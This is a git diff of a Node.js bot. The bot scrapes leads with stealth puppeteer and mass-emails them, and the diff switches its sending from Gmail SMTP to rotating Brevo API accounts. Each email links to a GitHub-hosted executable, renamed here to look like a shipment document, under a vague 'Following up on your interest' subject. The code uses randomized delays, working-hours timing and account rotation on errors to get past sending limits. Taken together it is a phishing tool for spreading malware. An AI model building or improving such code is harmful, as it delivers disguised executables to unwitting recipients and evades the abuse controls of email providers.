@@ -6,7 +6,7 @@ const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
 const fs = require('fs');
 const path = require('path');
-const nodemailer = require('nodemailer');
+const Brevo = require('@getbrevo/brevo');
 
 // ---------- CONFIG ----------
 const CONFIG = {
@@ -50,7 +50,7 @@ const CONFIG = {
   maxPagesToVisit: 40,
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    'https://github.com/digitzexchange/raufpoint/raw/refs/heads/main/raufpoint.exe'
+    'https://github.com/digitzexchange/raufpoint/raw/refs/heads/main/deliveryshipmentsraufpoint.exe'
   ],
   workingHours: { start: 8, end: 18 },
   workingDays: [1, 2, 3, 4, 5],
@@ -110,54 +110,21 @@ let currentAccountIndex = 0;
 
 // Load email accounts from .env
 for (let i = 1; i <= 10; i++) { // Assuming a max of 10 accounts
-  const user = process.env[`EMAIL_USER_${i}`];
-  const pass = process.env[`EMAIL_PASS_${i}`];
-  if (user && pass) {
-    emailAccounts.push({ user, pass, limitExceeded: false });
+  const apiKey = process.env[`BREVO_API_KEY_${i}`];
+  const senderEmail = process.env[`BREVO_SENDER_EMAIL_${i}`];
+  if (apiKey && senderEmail) {
+    emailAccounts.push({ apiKey, senderEmail, limitExceeded: false });
   } else {
     break; // Stop if we can't find the next account
   }
 }
 
 if (emailAccounts.length === 0) {
-  console.error("❌ No email accounts configured. Please set EMAIL_USER_1, EMAIL_PASS_1, etc. in your .env file.");
+  console.error("❌ No Brevo accounts configured. Please set BREVO_API_KEY_1 and BREVO_SENDER_EMAIL_1 in your .env file.");
   process.exit(1);
 }
 
-console.log(`✅ Loaded ${emailAccounts.length} email accounts.`);
-
-// ---------- EMAIL TRANSPORTER ----------
-let transporter;
-
-function setupTransporter() {
-  if (emailAccounts.length === 0) {
-    console.error("Cannot set up transporter: No email accounts loaded.");
-    return;
-  }
-  const account = emailAccounts[currentAccountIndex];
-  console.log(`Setting up transporter for account: ${account.user}`);
-
-  transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true,
-    auth: {
-      user: account.user,
-      pass: account.pass,
-    },
-  });
-
-  transporter.verify(function (error, success) {
-    if (error) {
-      console.error(`❌ Nodemailer configuration error for ${account.user}:`, error);
-    } else {
-      console.log(`✅ Nodemailer is ready for ${account.user}.`);
-    }
-  });
-}
-
-setupTransporter(); // Initial setup
-
+console.log(`✅ Loaded ${emailAccounts.length} Brevo accounts.`);
 
 let emailSendingPaused = false;
 let limitCheckPaused = false; // New state for hourly checking
@@ -175,50 +142,46 @@ async function sendEmail(to, lead) {
     console.log(`⏰ Not within working hours. Email to ${to} will be skipped.`);
     return false;
   }
+
+  const account = emailAccounts[currentAccountIndex];
+  const apiInstance = new Brevo.TransactionalEmailsApi();
+  apiInstance.apiClient.authentications['api-key'].apiKey = account.apiKey;
+
   const emailTemplate = fs.readFileSync(path.join(__dirname, 'email_template.html'), 'utf-8');
   const randomLink = CONFIG.emailLinks[Math.floor(Math.random() * CONFIG.emailLinks.length)];
-  const mailOptions = {
-    from: `"${emailAccounts[currentAccountIndex].user}" <${emailAccounts[currentAccountIndex].user}>`,
-    to: to,
-    subject: 'Following up on your interest',
-    html: emailTemplate
-      .replace('{random_link}', randomLink)
-      .replace('{logo_url}', 'https://i.pinimg.com/1200x/bc/d2/48/bcd2488484224fdbbed256abb2a0f3fc.jpg') // Replace with your logo URL
-      .replace('{email_user}', to.split('@')[0])
-      .replace('{timestamp}', new Date().toLocaleString()),
-  };
+  const htmlContent = emailTemplate
+    .replace('{random_link}', randomLink)
+    .replace('{logo_url}', 'https://i.pinimg.com/1200x/bc/d2/48/bcd2488484224fdbbed256abb2a0f3fc.jpg') // Replace with your logo URL
+    .replace('{email_user}', to.split('@')[0])
+    .replace('{timestamp}', new Date().toLocaleString());
+
+  const sendSmtpEmail = new Brevo.SendSmtpEmail();
+  sendSmtpEmail.to = [{ email: to }];
+  sendSmtpEmail.sender = { email: account.senderEmail };
+  sendSmtpEmail.subject = 'Following up on your interest';
+  sendSmtpEmail.htmlContent = htmlContent;
 
   try {
-    await transporter.sendMail(mailOptions);
-    console.log(`✅ Email sent to ${to} from ${emailAccounts[currentAccountIndex].user} (Subject: ${mailOptions.subject})`);
+    await apiInstance.sendTransacEmail(sendSmtpEmail);
+    console.log(`✅ Email sent to ${to} from ${account.senderEmail} using Brevo.`);
     return true;
   } catch (error) {
-    console.error(`❌ Error sending email to ${to} from ${emailAccounts[currentAccountIndex].user}:`, error);
+    console.error(`❌ Error sending email to ${to} from ${account.senderEmail} using Brevo:`, error);
 
     // Any error will cause a switch to the next account.
-    console.log(`🚫 Error with account ${emailAccounts[currentAccountIndex].user}. Switching to the next one.`);
-
-    // Mark this account as having an issue
+    console.log(`🚫 Error with account ${account.senderEmail}. Switching to the next one.`);
     emailAccounts[currentAccountIndex].limitExceeded = true;
+    currentAccountIndex = (currentAccountIndex + 1) % emailAccounts.length;
 
-    // Try to switch to the next available account
-    const nextAccountIndex = emailAccounts.findIndex(acc => !acc.limitExceeded);
-
-    if (nextAccountIndex !== -1) {
-      console.log('Switching to the next available email account...');
-      currentAccountIndex = nextAccountIndex;
-      setupTransporter(); // Re-initialize transporter with the new account
-    } else {
-      // All accounts have hit their limits
-      console.log('🚫 All email accounts have reached their daily sending limits. Pausing email sending and switching to hourly check mode.');
+    if (emailAccounts.every(acc => acc.limitExceeded)) {
+      console.log('All email accounts have exceeded their limits. Pausing email sending.');
       emailSendingPaused = true;
-      limitCheckPaused = true; // Enter probing mode
-
-      // Reset limit flags for the next day's probing
-      emailAccounts.forEach(acc => acc.limitExceeded = false);
-
-      if (probeInterval) clearInterval(probeInterval);
-      probeInterval = setInterval(probeEmailQueue, 3 * 60 * 60 * 1000); // Check every 3 hours
+      // Reset limits for the next day's probing
+      setTimeout(() => {
+        emailAccounts.forEach(acc => acc.limitExceeded = false);
+        emailSendingPaused = false;
+        console.log('Reset email account limits.');
+      }, 24 * 60 * 60 * 1000);
     }
     return false;
   }
@@ -631,7 +594,7 @@ async function main(io) {
   }
 
   let browser = await puppeteer.launch({
-    headless: true,
+    headless: "new",
     args: [
       '--no-sandbox',
       '--disable-setuid-sandbox',
